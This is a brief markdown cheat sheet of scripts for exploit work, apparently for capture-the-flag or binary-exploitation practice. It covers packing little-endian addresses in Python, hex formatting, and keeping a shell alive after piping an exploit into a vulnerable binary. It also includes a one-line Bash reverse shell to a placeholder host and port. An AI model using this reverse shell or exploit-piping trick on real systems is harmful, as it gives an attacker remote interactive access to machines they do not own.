
# Useful Scripts & Commands 🧰

## Commands:

### Python 

1. Print an adress in little endian:
`python -c "import struct; print(struct.pack('<I',0xdeadbeef))"`
2. Convert numbers into a string in hex format (0x prefix with zero padding): `"{:#04x}.format(n)"`


### Bash

1. Maintain shell after running an exploiting: `(./exploit | cat ) | ./vuln`
2. Simple Bash revshell: `bash -i >& /dev/tcp/{host_ip}/{port} 0>&1`
